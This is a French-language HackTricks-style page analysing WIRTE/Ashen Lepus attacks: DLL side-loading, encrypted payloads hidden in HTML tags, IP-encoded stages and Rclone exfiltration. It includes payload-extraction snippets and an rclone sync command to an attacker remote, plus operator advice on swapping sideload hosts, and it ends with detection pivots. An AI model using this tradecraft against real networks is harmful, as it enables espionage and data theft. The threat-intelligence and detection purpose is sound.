# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Vue d'ensemble du Tradecraft

Ashen Lepus (également connu sous le nom de WIRTE) a weaponized un pattern reproductible qui enchaîne DLL sideloading, staged HTML payloads et modular .NET backdoors pour maintenir une persistence au sein de réseaux diplomatiques du Moyen-Orient. La technique est réutilisable par n'importe quel opérateur, car elle repose sur :<sup>[[1]](#references)</sup>

- **Social engineering basé sur des archives** : des PDF inoffensifs demandent aux cibles de télécharger une archive RAR depuis un site de file-sharing. L'archive contient un EXE de document viewer à l'apparence légitime, une DLL malveillante portant le nom d'une bibliothèque de confiance (par exemple, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), ainsi qu'un `Document.pdf` leurre.
- **Abus de l'ordre de recherche des DLL** : la victime double-clique sur l'EXE, Windows résout l'importation de la DLL depuis le répertoire courant, et le loader malveillant (AshenLoader) s'exécute dans le processus de confiance tandis que le PDF leurre s'ouvre pour éviter les soupçons.
- **Staging Living-off-the-land** : chaque stage ultérieur (AshenStager → AshenOrchestrator → modules) est conservé hors disque jusqu'à ce qu'il soit nécessaire, puis transmis sous forme de blobs chiffrés dissimulés dans des réponses HTML par ailleurs inoffensives.

## Chaîne de Side-Loading en plusieurs Stages

1. **EXE leurre → AshenLoader** : l'EXE effectue le side-loading d'AshenLoader, qui réalise une reconnaissance de l'hôte, le chiffre avec AES-CTR, puis l'envoie via POST dans des paramètres alternants tels que `token=`, `id=`, `q=` ou `auth=` vers des paths ressemblant à des API (par exemple, `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Extraction HTML** : le C2 ne révèle le stage suivant que lorsque l'adresse IP du client est géolocalisée dans la région cible et que le `User-Agent` correspond à l'implant, ce qui contrarie les sandboxes. Lorsque les vérifications réussissent, le corps HTTP contient un blob `<headerp>...</headerp>` avec le payload AshenStager chiffré en Base64/AES-CTR.
3. **Second sideload** : AshenStager est déployé avec un autre binaire légitime qui importe `wtsapi32.dll`. La copie malveillante injectée dans le binaire récupère davantage de HTML, puis extrait cette fois `<article>...</article>` pour récupérer AshenOrchestrator.
4. **AshenOrchestrator** : un contrôleur .NET modulaire qui décode une configuration JSON en Base64. Les champs `tg` et `au` de la configuration sont concaténés et hashés pour former la clé AES, qui déchiffre `xrk`. Les octets obtenus servent de clé XOR pour chaque blob de module récupéré ensuite.
5. **Transmission des modules** : chaque module est décrit via des commentaires HTML qui redirigent le parser vers un tag arbitraire, contournant les règles statiques qui recherchent uniquement `<headerp>` ou `<article>`. Les modules comprennent la persistence (`PR*`), des uninstallers (`UN*`), la reconnaissance (`SN`), la capture d'écran (`SCT`) et l'exploration de fichiers (`FE`).

### Pattern d'Analyse de Conteneur HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Même si les défenseurs bloquent ou suppriment un élément spécifique, l’opérateur n’a qu’à modifier le tag indiqué dans le commentaire HTML pour reprendre la livraison.<sup>[[1]](#references)</sup>

### Assistant d’extraction rapide (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Parallèles avec l'évasion par HTML Staging

Des recherches récentes sur le HTML smuggling (Talos) mettent en évidence des payloads dissimulés sous forme de chaînes Base64 à l'intérieur de blocs `<script>` dans des pièces jointes HTML, puis décodés par JavaScript au moment de l'exécution.<sup>[[2]](#references)</sup> La même technique peut être réutilisée pour les réponses C2 : placer des blobs chiffrés dans une balise script (ou un autre élément DOM) et les décoder en mémoire avant AES/XOR, afin que la page ressemble à du HTML ordinaire. Talos montre également une obfuscation en couches (renommage des identifiants associé à Base64/Caesar/AES) à l'intérieur de balises script, ce qui s'applique directement aux blobs C2 staged en HTML.<sup>[[2]](#references)</sup> Une analyse ultérieure de Talos sur le **hidden text salting** est également pertinente ici : découper Base64 avec des commentaires HTML ou des espaces superflus suffit à contourner les extracteurs regex simples tout en gardant une reconstruction triviale côté navigateur.<sup>[[7]](#references)</sup>

## Notes sur les variantes récentes (2024-2025)

- Check Point a observé des campagnes WIRTE en 2024 qui reposaient toujours sur du sideloading basé sur des archives, mais utilisaient `propsys.dll` (stagerx64) comme première étape. Le stager décode le payload suivant avec Base64 + XOR (clé `53`), envoie des requêtes HTTP avec un `User-Agent` hardcodé et extrait des blobs chiffrés intégrés entre des balises HTML. Dans une branche, la stage était reconstruite à partir d'une longue liste de chaînes IP intégrées, décodées via `RtlIpv4StringToAddressA`, puis concaténées dans les octets du payload.<sup>[[3]](#references)</sup>
- OWN-CERT a documenté des outils WIRTE antérieurs dans lesquels le dropper `wtsapi32.dll` side-loadé protégeait les chaînes avec Base64 + TEA et utilisait le nom de la DLL lui-même comme clé de déchiffrement, puis obfusquait les données d'identification de l'hôte avec XOR/Base64 avant de les envoyer au C2.<sup>[[4]](#references)</sup>

## Reconstruction des stages encodés en IP

La branche `propsys.dll` de WIRTE en 2024 montre que le PE suivant n'a pas besoin de se trouver dans un blob HTML contigu unique. Le loader peut stocker les octets de la stage sous forme de chaînes dotted-quad et les reconstruire avec `RtlIpv4StringToAddressA`, selon un modèle étroitement lié au tradecraft **IPfuscation** de Hive.<sup>[[3]](#references)[[5]](#references)</sup> Sur le plan opérationnel, cette méthode est utile lorsque l'acteur veut que la page HTML contienne ce qui ressemble à des IOCs ou à des données de configuration inoffensives plutôt qu'un payload Base64 évident.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Si les octets récupérés commencent par `MZ`, vous avez probablement reconstruit directement le PE suivant. Sinon, recherchez une couche XOR/Base64 initiale ou de petits fragments délimiteurs entre les adresses.

## Noms de DLL interchangeables et rotation des hôtes

Une propriété importante de ce modèle est que le **backend de staging HTML/AES/XOR peut rester identique, tandis que seule la paire de sideload change**. WIRTE a utilisé tour à tour `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` et `propsys.dll` au cours de différentes campagnes, ce qui est utile pour les raisons suivantes :<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` et `wtsapi32.dll` sont des noms de DLL Windows banals dont les defenders s'attendent à l'existence dans `%System32%` / `%SysWOW64%`.
- Des catalogues publics tels que **HijackLibs** répertorient déjà de nombreux binaires qui chargeront ces noms de DLL depuis le répertoire d'une application copiée, offrant ainsi aux operators des hôtes de remplacement sans devoir repenser le stager.
- Seule la surface d'exportation doit être adaptée pour chaque hôte. Le parseur HTML, les routines AES/XOR et le module loader peuvent généralement être transplantés sans modification dans une proxy DLL de forwarding.

Pour le travail en offensive lab, cela signifie que vous pouvez séparer le problème en **(1) trouver un hôte signé stable qui résout localement le nom de DLL choisi** et **(2) réutiliser la même logique de loader staged-HTML derrière cette DLL**.

## Durcissement de la crypto et du C2

- **AES-CTR partout** : les loaders actuels intègrent des clés de 256 bits ainsi que des nonces (par ex. `{9a 20 51 98 ...}`) et ajoutent éventuellement une couche XOR utilisant des chaînes telles que `msasn1.dll` avant/après le déchiffrement.<sup>[[1]](#references)</sup>
- **Variations du key material** : les loaders précédents utilisaient Base64 + TEA pour protéger les chaînes intégrées, avec une clé de déchiffrement dérivée du nom de la DLL malveillante (par ex. `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Séparation de l'infrastructure + camouflage des sous-domaines** : les staging servers sont séparés par outil, hébergés sur différents ASN et parfois placés derrière des sous-domaines à l'apparence légitime, de sorte que la compromission d'un stage n'expose pas le reste.
- **Recon smuggling** : les données énumérées incluent désormais les listings de Program Files afin d'identifier les applications à forte valeur, et sont toujours chiffrées avant de quitter l'hôte.
- **Rotation des URI** : les paramètres de requête et les chemins REST changent entre les campagnes (`/api/v1/account?token=` → `/api/v2/account?auth=`), ce qui rend les détections fragiles inopérantes.
- **User-Agent pinning + redirections sûres** : l'infrastructure C2 ne répond qu'à des chaînes UA exactes et redirige sinon vers des sites d'actualités ou de santé inoffensifs afin de se fondre dans le trafic normal.
- **Gated delivery** : les serveurs sont protégés par géorestriction et ne répondent qu'aux implants réels. Les clients non approuvés reçoivent du HTML sans particularité.

## Persistence et boucle d'exécution

AshenStager crée des scheduled tasks qui se font passer pour des tâches de maintenance Windows et s'exécutent via `svchost.exe`, par exemple :<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ces tâches relancent la chaîne de sideload au démarrage ou à intervalles réguliers, ce qui permet à AshenOrchestrator de demander de nouveaux modules sans réécrire sur le disque.

## Utilisation de clients de synchronisation légitimes pour l'exfiltration

Les operators placent des documents diplomatiques dans `C:\Users\Public` (lisible par tous et peu suspect) via un module dédié, puis téléchargent le binaire légitime [Rclone](https://rclone.org/) afin de synchroniser ce répertoire avec le stockage de l'attaquant. Unit42 indique qu'il s'agit de la première observation de l'utilisation de Rclone pour l'exfiltration par cet actor, ce qui s'inscrit dans la tendance plus large consistant à détourner des outils de synchronisation légitimes pour se fondre dans le trafic normal :<sup>[[1]](#references)</sup>

1. **Stager** : copier/collecter les fichiers cibles dans `C:\Users\Public\{campaign}\`.
2. **Configurer** : fournir une configuration Rclone pointant vers un endpoint HTTPS contrôlé par l'attaquant (par ex. `api.technology-system[.]com`).
3. **Synchroniser** : exécuter `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` afin que le trafic ressemble à des sauvegardes cloud normales.

Comme Rclone est largement utilisé pour les workflows de sauvegarde légitimes, les defenders doivent se concentrer sur les exécutions anormales (nouveaux binaires, remotes inhabituels ou synchronisation soudaine de `C:\Users\Public`).

## Pivots de détection

- Déclencher une alerte sur les **processus signés** qui chargent de manière inattendue des DLL depuis des chemins accessibles en écriture par les utilisateurs (filtres Procmon + `Get-ProcessMitigation -Module`), en particulier lorsque les noms de DLL correspondent à `netutils`, `srvcli`, `dwampi`, `wtsapi32` ou `propsys`.<sup>[[6]](#references)</sup>
- Examiner les réponses HTTPS suspectes contenant de **grands blobs Base64 intégrés dans des tags inhabituels** ou protégés par des commentaires `<!-- TAG: <xyz> -->`.
- Normaliser d'abord le HTML : **supprimer les commentaires et réduire les espaces avant l'extraction Base64**, car l'évasion de type hidden-text-salting peut répartir les payloads entre les limites de commentaires.
- Étendre la recherche HTML aux **chaînes Base64 situées dans des blocs `<script>`** (staging de type HTML smuggling), qui sont décodées par JavaScript avant le traitement AES/XOR.
- Rechercher les appels répétés à **`RtlIpv4StringToAddressA` suivis de l'assemblage d'un buffer**, en particulier lorsque les chaînes environnantes sont de longues listes d'adresses IPv4 plutôt que de véritables cibles réseau.
- Rechercher les **scheduled tasks** qui exécutent `svchost.exe` avec des arguments qui ne correspondent pas à un service ou qui renvoient vers des répertoires de droppers.
- Suivre les **redirections C2** qui ne renvoient des payloads que pour des chaînes `User-Agent` exactes et redirigent sinon vers des domaines légitimes d'actualités ou de santé.
- Surveiller l'apparition de binaires **Rclone** en dehors des emplacements gérés par l'IT, les nouveaux fichiers `rclone.conf` ou les tâches de synchronisation extrayant des données de répertoires de staging tels que `C:\Users\Public`.

## References

- [1] [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Seasoning email threats with hidden text salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
